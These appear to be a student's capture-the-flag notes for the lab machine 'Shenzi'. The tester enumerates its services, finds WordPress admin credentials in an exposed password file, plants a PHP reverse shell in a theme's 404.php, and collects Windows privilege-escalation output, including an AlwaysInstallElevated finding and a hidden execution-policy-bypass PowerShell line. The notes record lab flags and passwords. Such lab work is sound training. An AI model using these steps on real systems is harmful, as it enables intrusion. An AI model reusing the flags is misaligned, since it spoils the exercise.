**Metadata**

- Exercise Name: Shenzi
- IP Address: 192.168.148.55
- Hostname:
- OS:
- Found Credentials/Users:
   admin:FeltHeadwallWight357

Main Objectives:

Local.txt = a7b21173ca06d8abdb02cc49565145d9
Proof.txt = 706c03d883f06d783ec417ffe545c408

**Enumeration**

1. NMAP Scans Output (TCP/UDP)

```
- TCP Quick: `OK` | `nmap -sC -sV --top-ports 1000 -T4 -oA /home/kali/ProvingGround/Shenzi/NMAP/tcp_quick 192.168.148.55`
- TCP Full: `OK` | `nmap -p- -sC -sV -T4 -oA /home/kali/ProvingGround/Shenzi/NMAP/tcp_full 192.168.148.55`
- XML files: `tcp_full.xml`, `tcp_quick.xml`, `udp_quick.xml`
  
  
  Nmap scan report for 192.168.148.55
Host is up (0.072s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.148.55/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.148.55/dashboard/
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-14T18:18:44
|_  start_date: N/A

```

2. Service Enumeration

Recommendation Source: Static fallback (Static: 15)

FTP Enumeration Port 21

```
Run: ftp 192.168.148.55 21
Check anonymous login and writable directories.
Download all files and inspect for credentials/scripts/source code.
Resource: HackTricks > FTP and ippsec walkthroughs for FTP footholds.

21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla

ftp 192.168.148.55 21                                                                                                      
Connected to 192.168.148.55.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.148.55:kali): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> 

hydra -L users -P passwords 192.168.148.55 ftp                                                  
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-14 13:09:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:8/p:3), ~2 tries per task
[DATA] attacking ftp://192.168.148.55:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-14 13:10:24


```

HTTP Enumeration Port 80

```
Run: ffuf -u http://192.168.148.55:80/FUZZ -w /usr/share/wordlists/dirb/common.txt
Run: nikto -h http://192.168.148.55:80
Check source comments, hidden endpoints, and default credentials.
Resource: HackTricks > Pentesting Web and PortSwigger Web Security Academy.

80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.148.55/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

Open Directories:
http://192.168.148.55:80/img
http://192.168.148.55:80/xampp
http://192.168.148.55:80/dashboard

Site Visit: 
- Looks like a defualt page for XAMPP
- PHPInfo data available http://192.168.148.55/dashboard/phpinfo.php
  
nikto -h 192.168.148.55       
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.148.55
+ Target Hostname:    192.168.148.55
+ Target Port:        80
+ Start Time:         2026-02-14 13:03:00 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+ /: Retrieved x-powered-by header: PHP/7.4.6.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://192.168.148.55/dashboard/
+ OpenSSL/1.1.1g appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/2.4.43 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/7.4.6 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8909 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2026-02-14 13:15:55 (GMT-7) (775 seconds)

Found WordPress site at http://192.168.148.55/Shenzi
  
  
```

MSRPC Enumeration Port 135

```
Enumerate MSRPC on tcp/135 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

NetBIOS/SMB Enumeration Port 139

```
Enumerate NetBIOS/SMB on tcp/139 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

HTTP Enumeration Port 443

```
Run: ffuf -u http://192.168.148.55:443/FUZZ -w /usr/share/wordlists/dirb/common.txt
Run: nikto -h http://192.168.148.55:443
Check source comments, hidden endpoints, and default credentials.
Resource: HackTricks > Pentesting Web and PortSwigger Web Security Academy.
```

SMB Enumeration Port 445

```
Enumerate SMB on tcp/445 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.


 cat passwords.txt                                                                   
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357



```

MySQL Enumeration Port 3306

```
Run: mysql -h 192.168.148.55 -P 3306 -u root -p
Test blank/default credentials in lab environments.
Enumerate databases/tables for password reuse and web app linkage.
Resource: HackTricks > MySQL and GTFOBins for post-login abuse.

 sudo nmap -p 3306 --script=mysql-info,mysql-enum,mysql-databases,mysql-users,mysql-variables,mysql-empty-password,mysql-brute 192.168.148.55 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 11:51 MST
Nmap scan report for 192.168.148.55
Host is up (0.085s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
|_mysql-empty-password: Host '192.168.45.215' is not allowed to connect to this MariaDB server
| mysql-enum: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 10 guesses in 2 seconds, average tps: 5.0
| mysql-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 50009 guesses in 467 seconds, average tps: 104.7


```

Unknown Service Enumeration Port 5040

```
Enumerate Unknown Service on tcp/5040 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

PANDO-PUB Enumeration Port 7680

```
Enumerate PANDO-PUB on tcp/7680 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

MSRPC Enumeration Port 49664

```
Enumerate MSRPC on tcp/49664 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

MSRPC Enumeration Port 49665

```
Enumerate MSRPC on tcp/49665 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

MSRPC Enumeration Port 49666

```
Enumerate MSRPC on tcp/49666 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

MSRPC Enumeration Port 49667

```
Enumerate MSRPC on tcp/49667 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

MSRPC Enumeration Port 49668

```
Enumerate MSRPC on tcp/49668 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

MSRPC Enumeration Port 49669

```
Enumerate MSRPC on tcp/49669 with nmap NSE scripts.
Check default credentials, anonymous access, and known CVEs for detected version.
Correlate findings with credential reuse and local file disclosure opportunities.
Resource: HackTricks service index and searchsploit for version-specific paths.
```

3. Possible Exploits

```
Found WordPress site at http://192.168.148.55/Shenzi

WordPress:

   User: admin
   Password: FeltHeadwallWight357

```

4. Other Notes

```

```

**Initial Foothold**

1. Exploit Steps

- Navigated to WordPress site and logged in as admin using discovered credentials.

![[Pasted image 20260216130017.png]]

- Edited the 404.php template with a reverse shell  in Themes Editor. Used PHP reverse shell found here https://github.com/ivan-sincek/php-reverse-shell/tree/master/src/reverse.  

![[Pasted image 20260216130220.png]]

- Navigated to location of 404.php to execute the malicious code.

![[Pasted image 20260216130421.png]]

- Received reverse shell using Penelope and found the local.txt

![[Pasted image 20260216130647.png]]

2. Shell Access

```

```

**Post-Exploitation**

1. Shell / Context (reference)

```
If you need a cleaner PowerShell:
  powershell -NoP -NonI -W Hidden -Exec Bypass
  set-alias wget Invoke-WebRequest
  set-alias curl Invoke-WebRequest

```

2. Identity & System Info

```
[+] Host identity (OSCP summary)
User: SHENZI\shenzi
Hostname: SHENZI
Domain joined: False
Domain/Workgroup: WORKGROUP
OS: Microsoft Windows 10 Pro 10.0.19042 (Build 19042)
Architecture: 64-bit
Last boot: 08/02/2024 05:04:34

[+] Patch level (hotfix IDs only, first 25)
$ wmic qfe get HotFixID,InstalledOn | findstr /R /V \
ERROR: FINDSTR: No search strings
Command exit code: 2

```

3. Environment Info

```
[+] Environment variables (full)
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
AP_PARENT_PID                  7324
APPDATA                        C:\Users\shenzi\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   SHENZI
ComSpec                        C:\WINDOWS\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
HOMEDRIVE                      C:
HOMEPATH                       \Users\shenzi
LOCALAPPDATA                   C:\Users\shenzi\AppData\Local
LOGONSERVER                    \\SHENZI
NUMBER_OF_PROCESSORS           2
OneDrive                       C:\Users\shenzi\OneDrive
OS                             Windows_NT
Path                           C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\shenzi\AppData\Local\Microsoft\WindowsApps;
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL                23
PROCESSOR_REVISION             0102
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PROMPT                         $P$G
PSModulePath                   C:\Users\shenzi\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SESSIONNAME                    Console
SystemDrive                    C:
SystemRoot                     C:\WINDOWS
TEMP                           C:\Users\shenzi\AppData\Local\Temp
TMP                            C:\Users\shenzi\AppData\Local\Temp
USERDOMAIN                     SHENZI
USERDOMAIN_ROAMINGPROFILE      SHENZI
USERNAME                       shenzi
USERPROFILE                    C:\Users\shenzi
windir                         C:\WINDOWS

[+] Execution context + policy
PowerShell version: 5.1.19041.1320
Language mode: FullLanguage
        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned

[+] Writable PATH directories (hijack candidates)
ERROR: A parameter cannot be found that matches parameter name 'and'.

```

4. Users & Groups

```

```

5. AD Enumeration

```
# Powershell

Get-ADUser -Filter * (domain joined)
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"
```

6. Privileges & Tokens

```
[+] whoami /priv (full)
$ whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

[+] Enabled token privileges (high-value only)
No high-value privileges currently enabled.

[+] Integrity level
$ whoami /groups | findstr /I \
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

```

7. UAC & Policy Checks

```
[+] UAC / token filter / AlwaysInstallElevated (interpreted)
EnableLUA: 1
  -> UAC is enabled.
ConsentPromptBehaviorAdmin: 5
  -> Prompt for consent (non-Windows binaries).
LocalAccountTokenFilterPolicy:
  -> Value not present (treat as default: enabled).
AlwaysInstallElevated HKLM: 1
AlwaysInstallElevated HKCU: 1
  -> VULNERABLE: AlwaysInstallElevated is enabled in both HKLM and HKCU.

```

8. Processes & Services

```

[+] Auto-start service triage (non-system paths)
Name      : edgeupdate
StartName : LocalSystem
StartMode : Auto
State     : Stopped
PathName  : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
Name      : VGAuthService
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
Name      : VMTools
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

[+] Unquoted service path candidates (privesc)
(no output)

[+] Writable service binary candidates (privesc)
(no output)

[+] All running processes (full)
Name                         PID PPID User          Path                                                                                                         Command
----                         --- ---- ----          ----                                                                                                         -------
cmd.exe                     1300 7664 SHENZI\shenzi C:\WINDOWS\SYSTEM32\cmd.exe                                                                                  cmd.exe /c cmd.exe
cmd.exe                     8924 1300 SHENZI\shenzi C:\WINDOWS\system32\cmd.exe                                                                                  cmd.exe
conhost.exe                 6200 1300 SHENZI\shenzi C:\WINDOWS\system32\conhost.exe                                                                              \??\C:\WINDOWS\system32\conhost.exe 0x4
conhost.exe                 7400 7324 SHENZI\shenzi C:\WINDOWS\system32\conhost.exe                                                                              \??\C:\WINDOWS\system32\conhost.exe 0x4
csrss.exe                    428  416
csrss.exe                    516  492
ctfmon.exe                  5240 5192 SHENZI\shenzi
dllhost.exe                 1064  632
dllhost.exe                 7016  752 SHENZI\shenzi C:\WINDOWS\system32\DllHost.exe                                                                              C:\WINDOWS\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
dwm.exe                      972  596
explorer.exe                5516 5476 SHENZI\shenzi C:\WINDOWS\Explorer.EXE                                                                                      C:\WINDOWS\Explorer.EXE
FileZillaServer.exe         7340 7288 SHENZI\shenzi c:\xampp\filezillaftp\filezillaserver.exe                                                                    c:\xampp\filezillaftp\filezillaserver.exe -compat -start
fontdrvhost.exe              784  596
fontdrvhost.exe              792  500
GameBar.exe                 3192  752 SHENZI\shenzi C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.420.8043.0_x64__8wekyb3d8bbwe\GameBar.exe         "C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.420.8043.0_x64__8wekyb3d8bbwe\GameBar.exe" -ServerName:App.AppXbdkk0yrkwpcgeaem8zk81k8py1eaahny.mca
GameBarFT.exe               8244 6580 SHENZI\shenzi C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.420.8043.0_x64__8wekyb3d8bbwe\GameBarFT.exe       "C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.420.8043.0_x64__8wekyb3d8bbwe\GameBarFT.exe" /InvokerPRAID: App
GameBarFTServer.exe         4976  752 SHENZI\shenzi C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.420.8043.0_x64__8wekyb3d8bbwe\GameBarFTServer.exe "C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.420.8043.0_x64__8wekyb3d8bbwe\GameBarFTServer.exe" -Embedding
httpd.exe                   7324 7288 SHENZI\shenzi c:\xampp\apache\bin\httpd.exe                                                                                c:\xampp\apache\bin\httpd.exe
httpd.exe                   7664 7324 SHENZI\shenzi C:\xampp\apache\bin\httpd.exe                                                                                C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache
lsass.exe                    652  500
Memory Compression          1260    4
MicrosoftEdgeUpdate.exe     6228 6256
msdtc.exe                   3380  632
mysqld.exe                  7332 7288 SHENZI\shenzi c:\xampp\mysql\bin\mysqld.exe                                                                                "c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone
OneDrive.exe                7116 5516 SHENZI\shenzi C:\Users\shenzi\AppData\Local\Microsoft\OneDrive\OneDrive.exe                                                "C:\Users\shenzi\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
powershell.exe              5028 8924 SHENZI\shenzi C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe                                                    powershell
Registry                      92    4
RuntimeBroker.exe            868  752 SHENZI\shenzi C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           5640  752 SHENZI\shenzi C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           5724  752 SHENZI\shenzi C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           6156  752 SHENZI\shenzi C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           6360  752 SHENZI\shenzi C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           6580  752 SHENZI\shenzi C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
SearchApp.exe               3824  752 SHENZI\shenzi C:\WINDOWS\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe                                   "C:\WINDOWS\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
SearchFilterHost.exe        5276 6412
SearchIndexer.exe           6412  632
SearchProtocolHost.exe      1308 6412
SecurityHealthService.exe   5828  632
services.exe                 632  500
SgrmBroker.exe              6724  632
ShellExperienceHost.exe     8864  752 SHENZI\shenzi C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe                              "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
sihost.exe                  4808 2044 SHENZI\shenzi C:\WINDOWS\system32\sihost.exe                                                                               sihost.exe
smss.exe                     324    4
StartMenuExperienceHost.exe 5756  752 SHENZI\shenzi C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe    "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
svchost.exe                  492  632
svchost.exe                  520  632
svchost.exe                  708  632
svchost.exe                  752  632
svchost.exe                  872  632
svchost.exe                  920  632
svchost.exe                  928  632 SHENZI\shenzi C:\WINDOWS\system32\svchost.exe                                                                              C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
svchost.exe                  988  632
svchost.exe                 1108  632
svchost.exe                 1128  632
svchost.exe                 1144  632
svchost.exe                 1152  632
svchost.exe                 1168  632
svchost.exe                 1216  632
svchost.exe                 1332  632
svchost.exe                 1400  632
svchost.exe                 1408  632
svchost.exe                 1504  632
svchost.exe                 1520  632
svchost.exe                 1536  632
svchost.exe                 1616  632 SHENZI\shenzi C:\WINDOWS\system32\svchost.exe                                                                              C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
svchost.exe                 1644  632
svchost.exe                 1672  632
svchost.exe                 1732  632
svchost.exe                 1768  632
svchost.exe                 1828  632
svchost.exe                 1836  632
svchost.exe                 1852  632
svchost.exe                 1968  632
svchost.exe                 2000  632
svchost.exe                 2020  632
svchost.exe                 2044  632
svchost.exe                 2264  632
svchost.exe                 2272  632
svchost.exe                 2372  632
svchost.exe                 2380  632
svchost.exe                 2388  632
svchost.exe                 2400  632
svchost.exe                 2412  632
svchost.exe                 2468  632
svchost.exe                 2492  632
svchost.exe                 2520  632
svchost.exe                 2560  632
svchost.exe                 2664  632
svchost.exe                 2676  632
svchost.exe                 2792  632
svchost.exe                 2832  632
svchost.exe                 2944  632
svchost.exe                 3432  632
svchost.exe                 3708  632
svchost.exe                 3808  632
svchost.exe                 4252  632
svchost.exe                 4256  632
svchost.exe                 4400  632
svchost.exe                 4416  632
svchost.exe                 4440  632
svchost.exe                 4928  632
svchost.exe                 4952  632
svchost.exe                 5132  632
svchost.exe                 5192  632
svchost.exe                 5220  632
svchost.exe                 5364  632
svchost.exe                 5488  632
svchost.exe                 5972  632
svchost.exe                 6044  632 SHENZI\shenzi C:\WINDOWS\system32\svchost.exe                                                                              C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
svchost.exe                 6348  632
svchost.exe                 6716  632
svchost.exe                 6752  632
svchost.exe                 7132  632 SHENZI\shenzi C:\WINDOWS\System32\svchost.exe                                                                              C:\WINDOWS\System32\svchost.exe -k UnistackSvcGroup
svchost.exe                 8200  632
svchost.exe                 8696  632
System                         4    0
System Idle Process            0    0
taskhostw.exe               1956 1332 SHENZI\shenzi C:\WINDOWS\system32\taskhostw.exe                                                                            taskhostw.exe
taskhostw.exe               4708 1332 SHENZI\shenzi C:\WINDOWS\system32\taskhostw.exe                                                                            taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
TiWorker.exe                9104  752
TrustedInstaller.exe        4376  632
UserOOBEBroker.exe          2152  752 SHENZI\shenzi C:\Windows\System32\oobe\UserOOBEBroker.exe                                                                  C:\Windows\System32\oobe\UserOOBEBroker.exe -Embedding
VGAuthService.exe           2532  632
vmtoolsd.exe                2540  632
vmtoolsd.exe                4448 5516 SHENZI\shenzi C:\Program Files\VMware\VMware Tools\vmtoolsd.exe                                                            "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
wininit.exe                  500  416
winlogon.exe                 596  492
WmiPrvSE.exe                3248  752
WmiPrvSE.exe                5108  752
xampp-control.exe           7288 5516 SHENZI\shenzi C:\xampp\xampp-control.exe                                                                                   "C:\xampp\xampp-control.exe"
YourPhone.exe               1892  752 SHENZI\shenzi C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20101.84.0_x64__8wekyb3d8bbwe\YourPhone.exe               "C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20101.84.0_x64__8wekyb3d8bbwe\YourPhone.exe" -ServerName:App.AppX9yct9q388jvt4h7y0gn06smzkxcsnt8m.mca

```

9. Scheduled Tasks

```
[+] Scheduled task triage (OSCP-focused)
Suspicious scheduled tasks: 91 (showing first 40)
--------------------------------------------------------------------------------
Task: \OneDrive Reporting Task-S-1-5-21-2141929748-2461147466-4258878046-1002
RunAs: shenzi
Why: Non-Microsoft task path; Runs as user/service account: shenzi
Action: %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe /reporting
--------------------------------------------------------------------------------
Task: \OneDrive Standalone Update Task-S-1-5-21-2141929748-2461147466-4258878046-1002
RunAs: shenzi
Why: Non-Microsoft task path; Runs as user/service account: shenzi
Action: %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Application Experience\PcaPatchDbTask
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Application Experience\StartupAppTask
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe Startupscan.dll,SusRunTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\ApplicationData\CleanupTemporaryState
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState
